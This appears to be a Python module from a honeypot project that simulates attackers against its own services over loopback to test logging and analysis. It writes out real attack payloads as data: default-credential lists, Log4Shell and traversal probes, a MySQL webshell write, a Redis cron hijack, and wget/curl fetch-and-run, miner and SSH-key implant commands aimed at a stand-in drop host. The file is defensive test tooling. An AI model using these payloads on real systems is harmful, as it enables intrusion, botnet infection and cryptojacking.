"""Live attack simulator for local test mode.

Drives the *real* honeypot services over loopback with real protocol clients (asyncssh, raw telnet / HTTP /
MySQL / Redis) so the whole pipeline can be exercised end to end: honeypot -> event log -> ingest -> dashboard,
quarantine -> analyser -> report.

Safety: it only ever connects to the address it is given (default 127.0.0.1), refuses anything that is not
loopback, and every "malware" it drops is one of the harmless self-made fixtures in ``analysis.fixtures``.
Different "attackers" are loopback aliases ``127.77.x.y``; in test mode the services map those onto the
documentation address ranges (see ``netutil.test_alias``).
"""

from __future__ import annotations

import asyncio
import ipaddress
import logging
import random
import struct
import threading
import time
from collections.abc import Callable

from ..analysis.fixtures import C2_IP, DROP_IP, all_fixtures
from ..common.config import Settings

log = logging.getLogger("honeynet.simulator")

SSH_CREDS = [("root", "root"), ("root", "123456"), ("admin", "admin"), ("root", "password"), ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("root", "toor"),
             ("test", "test"), ("oracle", "oracle"), ("user", "user"), ("root", "admin123"), ("admin", "1234"), ("postgres", "postgres"), ("deploy", "deploy"),
             ("ubnt", "ubnt"), ("guest", "guest"), ("root", "qwerty"), ("root", "xc3511"), ("support", "support"), ("git", "git")]
IOT_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"), ("root", "default"), ("support", "support"), ("root", "juantech"),
             ("admin", "1234"), ("root", "klv123"), ("ubnt", "ubnt"), ("root", "7ujMko0admin"), ("admin", "password")]
SSH_CLIENTS = ["SSH-2.0-libssh2_1.9.0", "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.78", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-AsyncSSH_2.14"]

HTTP_PROBES = [
    ("GET", "/wp-login.php", {}, b""),
    ("POST", "/xmlrpc.php", {"Content-Type": "text/xml"}, b"<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName></methodCall>"),
    ("GET", "/phpmyadmin/index.php", {}, b""),
    ("GET", "/.env", {}, b""),
    ("GET", "/.git/config", {}, b""),
    ("GET", "/actuator/env", {}, b""),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", {}, b""),
    ("POST", "/boaform/admin/formLogin", {"Content-Type": "application/x-www-form-urlencoded"}, b"username=admin&psd=admin"),
    ("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=honeynet", {}, b""),
    ("GET", "/", {"X-Api-Version": "${jndi:ldap://" + DROP_IP + ":1389/a}"}, b""),
    ("GET", "/../../../../../../etc/passwd", {}, b""),
    ("GET", "/admin/config.php?id=1%27%20or%20%271%27=%271", {}, b""),
    ("GET", "/GponForm/diag_Form?images/", {}, b""),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {}, b"<?php echo md5('honeynet');"),
    ("GET", "/robots.txt", {}, b""),
    ("GET", "/server-status", {}, b""),
]
HTTP_AGENTS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "curl/7.81.0", "python-requests/2.31.0", "Go-http-client/1.1", "zgrab/0.x",
               "Mozilla/5.0 zgrab/0.x", "Wget/1.21", "masscan/1.3"]

MYSQL_QUERIES = ["select @@version", "show databases", "SELECT * FROM users WHERE id=1 OR 1=1", "select load_file('/etc/passwd')",
                 "select user,host from mysql.user", "SELECT '<?php eval($_POST[x]);?>' INTO OUTFILE '/var/www/html/x.php'"]
REDIS_SCRIPTS = [
    [["INFO"], ["CONFIG", "GET", "dir"], ["KEYS", "*"]],
    [["CONFIG", "SET", "dir", "/var/spool/cron/"], ["CONFIG", "SET", "dbfilename", "root"],
     ["SET", "x", f"\n\n*/1 * * * * curl -s http://{DROP_IP}/r.sh | sh\n\n"], ["SAVE"]],
    [["SLAVEOF", DROP_IP, "6379"], ["MODULE", "LOAD", "/tmp/exp.so"], ["FLUSHALL"]],
]


def drop_script(name: str, path: str, chunk: int = 48) -> list[str]:
    """Shell commands that rebuild a (harmless) fixture on the honeypot the way echo-droppers do."""
    data = all_fixtures()[name]
    cmds = [f"rm -f {path}"]
    for i in range(0, len(data), chunk):
        cmds.append("echo -ne '" + "".join(f"\\x{b:02x}" for b in data[i:i + chunk]) + f"' >> {path}")
    return cmds


class LiveAttacker:
    def __init__(self, host: str, ports: dict[str, list[int]], seed: int = 7, sources: int = 90) -> None:
        if not ipaddress.ip_address(host).is_loopback:
            raise SystemExit("the live simulator only talks to loopback addresses")
        self.host, self.ports = host, ports
        self.rng = random.Random(seed)
        self.sources = [f"127.77.{self.rng.randint(0, 3)}.{self.rng.randint(1, 250)}" for _ in range(sources)]
        self.weights = [1.0 / (i + 1) ** 0.7 for i in range(len(self.sources))]
        self.stats: dict[str, int] = {}
        self._sem = asyncio.Semaphore(10)
        self.stop = asyncio.Event()

    # ---------------------------------------------------------------- plumbing
    def src(self) -> str:
        return self.rng.choices(self.sources, self.weights)[0]

    def port(self, svc: str) -> int:
        return self.ports[svc][0]

    async def _open(self, svc: str, src: str) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        try:
            return await asyncio.wait_for(asyncio.open_connection(self.host, self.port(svc), local_addr=(src, 0)), 8)
        except OSError:                                         # platform without 127/8 aliasing: fall back to the default source
            return await asyncio.wait_for(asyncio.open_connection(self.host, self.port(svc)), 8)

    @staticmethod
    async def _read(r: asyncio.StreamReader, until: bytes | None = None, timeout: float = 4.0, limit: int = 65536) -> bytes:
        buf = b""
        end = time.monotonic() + timeout
        while time.monotonic() < end and len(buf) < limit:
            try:
                chunk = await asyncio.wait_for(r.read(4096), max(0.05, end - time.monotonic()))
            except asyncio.TimeoutError:
                break
            if not chunk:
                break
            buf += chunk
            if until is not None and until in buf:
                break
        return buf

    # ---------------------------------------------------------------- scenarios
    async def ssh(self, intruder: bool = False) -> None:
        import asyncssh

        src = self.src()
        tries = self.rng.sample(SSH_CREDS, self.rng.randint(1, 5))
        if intruder:
            tries = [("root", "123456"), ("admin", "admin")][: self.rng.randint(1, 2)]
        version = self.rng.choice(SSH_CLIENTS).removeprefix("SSH-2.0-")
        for user, pw in tries:
            try:
                conn = await asyncssh.connect(self.host, self.port("ssh"), username=user, password=pw, known_hosts=None, local_addr=(src, 0),
                                              client_keys=None, agent_path=None, public_key_auth=False, kbdint_auth=False, login_timeout=10,
                                              client_version=version)
            except asyncssh.PermissionDenied:
                await asyncio.sleep(self.rng.uniform(0.05, 0.4))
                continue
            except (OSError, asyncssh.Error):
                return
            async with conn:
                if intruder or self.rng.random() < 0.55:
                    await self._ssh_shell(conn)
                else:
                    await asyncio.sleep(self.rng.uniform(0.1, 0.8))
            return

    async def _ssh_shell(self, conn) -> None:
        r = self.rng
        recon = r.choice([["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "whoami"], ["id", "uname -s -m", "ls -la /tmp", "ps"], ["w", "cat /etc/passwd", "lscpu"]])
        kind = r.choice(["elf", "elf", "wget", "miner", "implant", "script", "recon"])
        if kind == "elf":
            script = recon + drop_script("mirai_like_x86_64.elf", "/tmp/.x") + ["chmod +x /tmp/.x", "/tmp/.x", "rm -f /tmp/.x"]
        elif kind == "wget":
            script = recon + [f"cd /tmp; wget http://{DROP_IP}/bins/bot.x86 -O .x; chmod +x .x; ./.x", "history -c"]
        elif kind == "miner":
            script = recon + [f"curl -s http://{DROP_IP}/miner.sh | sh", "crontab -l", f"echo '*/5 * * * * wget -q -O- http://{DROP_IP}/u.sh | sh' | crontab -",
                              "pkill -f xmrig", "nproc"]
        elif kind == "implant":
            script = ["cd ~; rm -rf .ssh; mkdir .ssh", "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0Honeynet mdrfckr' >> ~/.ssh/authorized_keys",
                      "chmod -R go= ~/.ssh", "cat /proc/cpuinfo | grep name | head -n 1", "uname -a"]
        elif kind == "script":
            script = recon + drop_script("dropper.sh", "/tmp/up.sh") + ["sh /tmp/up.sh", "rm -f /tmp/up.sh"]
        else:
            script = recon
        proc = await conn.create_process(term_type="xterm", encoding=None)
        try:
            await asyncio.wait_for(self._read(proc.stdout, until=b"# ", timeout=2), 3)
            for line in script:
                proc.stdin.write(line.encode() + b"\n")
                await asyncio.sleep(r.uniform(0.02, 0.2))
                await self._read(proc.stdout, until=b"# ", timeout=1.2)
            proc.stdin.write(b"exit\n")
            await asyncio.sleep(0.2)
        except Exception:  # noqa: BLE001 - a dropped connection just ends the scripted session
            log.debug("ssh shell interrupted", exc_info=True)

    async def telnet(self) -> None:
        r = self.rng
        src = self.src()
        rd, wr = await self._open("telnet", src)
        try:
            ok = False
            for user, pw in r.sample(IOT_CREDS, r.randint(1, 4)):
                await self._read(rd, until=b"login:", timeout=3)
                wr.write(user.encode() + b"\r\n")
                await self._read(rd, until=b"Password:", timeout=3)
                wr.write(pw.encode() + b"\r\n")
                out = await self._read(rd, until=b"incorrect", timeout=1.5)
                if b"incorrect" not in out:
                    ok = True
                    break
            if not ok:
                return
            arch = r.choice(["mips", "x86_64", "arm"])
            script = ["enable", "system", "shell", "sh", "/bin/busybox ECCHI", f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{DROP_IP}/bins/bot.{arch}; chmod 777 bot.{arch}; ./bot.{arch} telnet.{arch}"]
            if r.random() < 0.5:
                script = ["sh", "/bin/busybox ECCHI"] + drop_script({"mips": "mirai_like_mips.elf", "x86_64": "mirai_like_x86_64.elf", "arm": "mirai_like_arm.elf"}[arch], "/tmp/.bot") \
                    + ["chmod 777 /tmp/.bot", "/tmp/.bot telnet", "rm -rf /tmp/*"]
            for line in script:
                wr.write(line.encode() + b"\r\n")
                await self._read(rd, until=b"# ", timeout=0.8)
                await asyncio.sleep(r.uniform(0.01, 0.1))
        finally:
            wr.close()

    async def http_scan(self, upload: bool = False) -> None:
        r = self.rng
        src = self.src()
        agent = r.choice(HTTP_AGENTS)
        reqs = r.sample(HTTP_PROBES, r.randint(2, 6))
        if upload:
            reqs.append(("POST", "/wp-content/uploads/x.php", {"Content-Type": "application/octet-stream"}, all_fixtures()["webshell.php"]))
            reqs.append(("PUT", "/shell.sh", {}, all_fixtures()["revshell.sh"]))
        for method, path, headers, body in reqs:
            rd, wr = await self._open("http", src)
            try:
                head = [f"{method} {path} HTTP/1.1", f"Host: {self.host}", f"User-Agent: {agent}", "Accept: */*", "Connection: close"]
                head += [f"{k}: {v}" for k, v in headers.items()]
                if body:
                    head.append(f"Content-Length: {len(body)}")
                wr.write(("\r\n".join(head) + "\r\n\r\n").encode("latin-1", "replace") + body)
                await wr.drain()
                await self._read(rd, timeout=2, limit=32768)
            finally:
                wr.close()
            await asyncio.sleep(r.uniform(0.02, 0.25))

    async def mysql(self) -> None:
        from ..services.mysql import native_scramble

        r = self.rng
        rd, wr = await self._open("mysql", self.src())
        try:
            hdr = await asyncio.wait_for(rd.readexactly(4), 5)
            greet = await asyncio.wait_for(rd.readexactly(int.from_bytes(hdr[:3], "little")), 5)
            i = greet.index(b"\x00", 1) + 1 + 4                      # protocol byte, version string, connection id
            salt = greet[i:i + 8]
            i += 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10                       # filler, caps lo, charset, status, caps hi, auth len, reserved
            salt += greet[i:i + 12]
            user, pw = r.choice([("root", "123456"), ("root", "root"), ("admin", "admin"), ("mysql", "mysql"), ("root", ""), ("test", "test")])
            token = native_scramble(pw, salt) if pw else b""
            caps = 1 | 2 | 4 | (1 << 9) | (1 << 15) | (1 << 19)       # LONG_PASSWORD|FOUND_ROWS|LONG_FLAG|PROTOCOL_41|SECURE_CONNECTION|PLUGIN_AUTH
            body = (struct.pack("<IIB", caps, 1 << 24, 33) + b"\x00" * 23 + user.encode() + b"\x00" + bytes([len(token)]) + token
                    + b"mysql_native_password\x00")
            wr.write(len(body).to_bytes(3, "little") + b"\x01" + body)
            await self._read(rd, timeout=2)
            for q in r.sample(MYSQL_QUERIES, r.randint(1, 4)):
                payload = b"\x03" + q.encode()
                wr.write(len(payload).to_bytes(3, "little") + b"\x00" + payload)
                await self._read(rd, timeout=1)
        finally:
            wr.close()

    async def redis(self) -> None:
        rd, wr = await self._open("redis", self.src())
        try:
            for cmd in self.rng.choice(REDIS_SCRIPTS):
                wr.write(f"*{len(cmd)}\r\n".encode() + b"".join(f"${len(a.encode())}\r\n".encode() + a.encode() + b"\r\n" for a in cmd))
                await self._read(rd, timeout=1)
        finally:
            wr.close()

    async def scan(self) -> None:
        """Bare connect-and-leave probe on a random service port."""
        svc = self.rng.choice(["ssh", "telnet", "http", "mysql", "redis"])
        rd, wr = await self._open(svc, self.src())
        wr.close()

    # ---------------------------------------------------------------- driver
    def _pick(self) -> tuple[str, Callable[[], object]]:
        r = self.rng.random()
        if r < 0.22:
            return "ssh-bruteforce", self.ssh
        if r < 0.32:
            return "ssh-intruder", lambda: self.ssh(True)
        if r < 0.50:
            return "telnet-bot", self.telnet
        if r < 0.72:
            return "http-scan", self.http_scan
        if r < 0.78:
            return "http-upload", lambda: self.http_scan(True)
        if r < 0.86:
            return "mysql", self.mysql
        if r < 0.93:
            return "redis", self.redis
        return "scan", self.scan

    async def _one(self) -> None:
        name, fn = self._pick()
        async with self._sem:
            try:
                await asyncio.wait_for(fn(), 40)
                self.stats[name] = self.stats.get(name, 0) + 1
            except (asyncio.TimeoutError, OSError, EOFError, asyncio.IncompleteReadError, ConnectionError) as exc:
                self.stats["errors"] = self.stats.get("errors", 0) + 1
                log.debug("%s failed: %r", name, exc)
            except Exception as exc:  # noqa: BLE001
                self.stats["errors"] = self.stats.get("errors", 0) + 1
                log.warning("%s failed: %r", name, exc)

    async def run(self, duration: float = 60, rate_per_min: float = 30) -> dict[str, int]:
        end = time.monotonic() + duration
        tasks: set[asyncio.Task] = set()
        while time.monotonic() < end and not self.stop.is_set():
            t = asyncio.create_task(self._one())
            tasks.add(t)
            t.add_done_callback(tasks.discard)
            await asyncio.sleep(self.rng.expovariate(max(rate_per_min, 0.1) / 60.0))
        if tasks:
            await asyncio.wait(tasks, timeout=45)
        log.info("simulator finished: %s", self.stats)
        return self.stats


# ---------------------------------------------------------------------------------------- dev stack
DEV_PORTS = {"ssh": [12222], "telnet": [12323], "http": [18080], "mysql": [13306], "redis": [16379]}


def run_dev_stack(s: Settings, *, rate_per_min: float = 30, attacks: bool = True, backfill_hours: float = 24,
                  on_ready: Callable[[], None] | None = None) -> None:
    """Honeypots + analyser + (optional) simulators in background threads; ``on_ready`` runs in the caller's thread (the dashboard)."""
    from ..analysis.worker import AnalysisWorker
    from ..runner import build_context
    from ..services.base import get_service_class
    from .synthetic import SyntheticTraffic

    s.ports = {k: list(v) for k, v in DEV_PORTS.items()}
    s.analysis_poll_seconds = 2
    s.max_session_seconds = 45
    s.max_idle_seconds = 15
    s.max_conns_per_ip = 12
    if backfill_hours > 0:
        n = SyntheticTraffic(s, seed=11).backfill(hours=backfill_hours, per_hour=45)
        print(f"pre-loaded {n} synthetic sessions covering the last {backfill_hours:g}h")
    threading.Thread(target=AnalysisWorker(s).run_forever, name="analysis", daemon=True).start()

    ready = threading.Event()
    failed: list[BaseException] = []

    async def stack() -> None:
        services = []
        try:
            for name in ("ssh", "telnet", "http", "mysql", "redis"):
                svc = get_service_class(name)(build_context(name, s))
                await svc.start()
                services.append(svc)
        except BaseException as exc:  # noqa: BLE001
            failed.append(exc)
            ready.set()
            return
        ready.set()
        if attacks:
            await asyncio.sleep(1.5)
            atk = LiveAttacker("127.0.0.1", s.ports)
            await atk.run(duration=10**9, rate_per_min=rate_per_min)
        else:
            await asyncio.Event().wait()

    threading.Thread(target=lambda: asyncio.run(stack()), name="dev-stack", daemon=True).start()
    ready.wait(30)
    if failed:
        raise SystemExit(f"could not start honeypots: {failed[0]!r}")
    print("honeypots listening on 127.0.0.1: " + ", ".join(f"{k}:{v[0]}" for k, v in s.ports.items()))
    if attacks:
        print(f"live attack simulator running (~{rate_per_min:g} attacks/min, harmless fixtures only)")
    if on_ready:
        on_ready()
